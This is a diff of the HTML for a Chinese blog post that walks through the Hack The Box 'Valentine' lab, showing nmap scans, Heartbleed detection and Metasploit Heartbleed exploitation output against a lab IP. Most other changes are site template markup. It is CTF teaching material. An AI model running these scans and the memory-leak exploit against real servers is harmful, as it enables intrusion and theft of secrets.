@@ -6,24 +6,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
     <title>HTB靶机 012 Valentine WriteUp - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
-<meta name="author-link" content="">
-<meta name="description" content="Xavier&#39;s Blog，一个安全工作者的个人空间" /><meta name="keywords" content='HTB, OSCP' /><meta itemprop="name" content="HTB靶机 012 Valentine WriteUp">
-<meta itemprop="description" content=""><meta itemprop="datePublished" content="2023-05-01T19:55:27+08:00" />
-<meta itemprop="dateModified" content="2023-05-01T19:55:27+08:00" />
-<meta itemprop="wordCount" content="2848">
-<meta itemprop="keywords" content="HTB,OSCP," /><meta property="og:title" content="HTB靶机 012 Valentine WriteUp" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://www.bthoughts.top/posts/hackthebox-valentine/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-05-01T19:55:27+08:00" />
-<meta property="article:modified_time" content="2023-05-01T19:55:27+08:00" />
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="HTB靶机 012 Valentine WriteUp"/>
-<meta name="twitter:description" content=""/>
+<meta name="description" content="Xavier&#39;s Blog，一个安全工作者的个人空间"><meta name="keywords" content='HTB, OSCP'>
+  <meta itemprop="name" content="HTB靶机 012 Valentine WriteUp">
+  <meta itemprop="description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
+  <meta itemprop="datePublished" content="2023-05-01T19:55:27+08:00">
+  <meta itemprop="dateModified" content="2023-05-01T19:55:27+08:00">
+  <meta itemprop="wordCount" content="2848">
+  <meta itemprop="keywords" content="HTB,OSCP"><meta property="og:url" content="https://www.bthoughts.top/posts/hackthebox-valentine/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="HTB靶机 012 Valentine WriteUp">
+  <meta property="og:description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-05-01T19:55:27+08:00">
+    <meta property="article:modified_time" content="2023-05-01T19:55:27+08:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="OSCP">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB靶机 012 Valentine WriteUp">
+  <meta name="twitter:description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
 <meta name="application-name" content="Xavier&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bthoughts.top/posts/hackthebox-valentine/" /><link rel="prev" href="https://www.bthoughts.top/posts/20230425-shellspawn/" /><link rel="next" href="https://www.bthoughts.top/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://www.bthoughts.top/posts/hackthebox-valentine/" title="HTB靶机 012 Valentine WriteUp - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="https://www.bthoughts.top/posts/20230425-shellspawn/" title="Shell Spawning" /><link rel="next" type="text/html" href="https://www.bthoughts.top/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" title="018-SQL注入之GroupBy位置点注入" /><link rel="alternate" type="text/markdown" href="https://www.bthoughts.top/posts/hackthebox-valentine/index.md" title="HTB靶机 012 Valentine WriteUp - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
   {
     "@context": "http://schema.org",
     "@type": "BlogPosting",
@@ -40,49 +49,19 @@
         "name": "Xavier"
       },"description": ""
   }
-  </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
       <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
     <nav>
       <ul class="menu"><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/posts/"
-                
-                
-              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/categories/"
-                
-                
-              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/tags/"
-                
-                
-              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/friends/"
-                
-                
-              ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/tools/"
-                
-                
-              ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/about/"
-                
-                
-              ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
             <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
             <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
               <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
@@ -95,8 +74,7 @@
             </span>
           </li><li class="menu-item theme-switch" title="切换主题">
           <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-        </li>
-      </ul>
+        </li></ul>
     </nav>
   </div>
 </header><header class="mobile animate__faster" id="header-mobile">
@@ -125,51 +103,9 @@
             <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
               取消
             </a>
-          </li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/posts/"
-                  
-                  
-                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/categories/"
-                  
-                  
-                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/tags/"
-                  
-                  
-                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/friends/"
-                  
-                  
-                ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/tools/"
-                  
-                  
-                ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/about/"
-                  
-                  
-                ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item theme-switch" title="切换主题">
-          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-        </li></ul>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
     </nav>
   </div>
 </header><div class="search-dropdown desktop">
@@ -177,19 +113,13 @@
   </div>
   <div class="search-dropdown mobile">
     <div id="search-dropdown-mobile"></div>
-  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
-      <div class="toc-content always-active" id="toc-content-auto"></div></aside>
-
-  <aside class="aside-custom">
-    </aside>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
 
   <article class="page single">
-    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
-        <span>HTB靶机 012 Valentine WriteUp</span>
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>HTB靶机 012 Valentine WriteUp</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
-          <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
-      <div class="post-meta-line"><span title=2023-05-01&#32;19:55:27><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-05-01">2023-05-01</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2848 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 6 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2023-05-01 19:55:27"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-05-01">2023-05-01</time></span>&nbsp;<span title="2848 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2900 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 6 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="HTB靶机 012 Valentine WriteUp"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+          </span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -215,11 +145,17 @@
     <li><a href="#end">END</a></li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h1 id="012-valentine">012-Valentine</h1>
-<p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429004811139.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004811139.png, resource/012-Valentine.assets/image-20230429004811139.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004811139.png 2x" sizes="auto" data-title="image-20230429004811139" data-alt="image-20230429004811139" width="707" height="492" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="012-valentine" class="heading-element"><span>012-Valentine</span>
+  <a href="#012-valentine" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004811139.png" alt="image-20230429004811139" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004811139.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004811139.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004811139.png?size=large 2x" data-title="image-20230429004811139" style="--width: 707px;--aspect-ratio: 707 / 492;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>靶机IP：10.10.10.79</p>
-<h2 id="scan">Scan</h2>
-<p>nmap端口扫描：</p>
+<h2 id="scan" class="heading-element"><span>Scan</span>
+  <a href="#scan" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>nmap端口扫描：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -251,11 +187,10 @@
 </span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 28.88 seconds
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 28.88 seconds</span></span></code></pre></td></tr></table>
 </div>
 </div><p>访问80、443端口都是如下一张图片：</p>
-<p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429004953743.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004953743.png, resource/012-Valentine.assets/image-20230429004953743.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004953743.png 2x" sizes="auto" data-title="image-20230429004953743" data-alt="image-20230429004953743" width="2034" height="1222" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004953743.png" alt="image-20230429004953743" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004953743.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004953743.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004953743.png?size=large 2x" data-title="image-20230429004953743" style="--width: 2034px;--aspect-ratio: 2034 / 1222;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>通过图片联想到心脏滴血漏洞，使用nmap进行探测</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -340,8 +275,7 @@
 </span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.19 seconds
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.19 seconds</span></span></code></pre></td></tr></table>
 </div>
 </div><p>探测结果说明心脏滴血漏洞存在。</p>
 <p>之后先针对心脏滴血漏洞进行利用，同时扫描全端口，看看有没有忽略的信息</p>
@@ -390,13 +324,18 @@
 </span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1181.61 seconds
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1181.61 seconds</span></span></code></pre></td></tr></table>
 </div>
 </div><p>使用-sC 对相应端口进行扫描，发现无新增结果，就不写细节了。</p>
-<h2 id="heartbleed">Heartbleed</h2>
-<h3 id="msf">MSF</h3>
-<p>利用MSF进行漏洞利用</p>
+<h2 id="heartbleed" class="heading-element"><span>Heartbleed</span>
+  <a href="#heartbleed" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="msf" class="heading-element"><span>MSF</span>
+  <a href="#msf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>利用MSF进行漏洞利用</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -460,15 +399,17 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - Leaking heartbeat response <span class="c1">#1</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - Sending Client Hello...
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - SSL record <span class="c1">#1:</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - SSL record <span class="c1">#1:</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429155205097.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png, resource/012-Valentine.assets/image-20230429155205097.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png 2x" sizes="auto" data-title="image-20230429155205097" data-alt="image-20230429155205097" width="2278" height="1228" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
-<p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429155239318.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155239318.png, resource/012-Valentine.assets/image-20230429155239318.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155239318.png 2x" sizes="auto" data-title="image-20230429155239318" data-alt="image-20230429155239318" width="2290" height="1230" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
-<p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429155329208.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155329208.png, resource/012-Valentine.assets/image-20230429155329208.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155329208.png 2x" sizes="auto" data-title="image-20230429155329208" data-alt="image-20230429155329208" width="2286" height="1314" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</div><p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png" alt="image-20230429155205097" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png?size=large 2x" data-title="image-20230429155205097" style="--width: 2278px;--aspect-ratio: 2278 / 1228;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155239318.png" alt="image-20230429155239318" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155239318.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155239318.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155239318.png?size=large 2x" data-title="image-20230429155239318" style="--width: 2290px;--aspect-ratio: 2290 / 1230;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
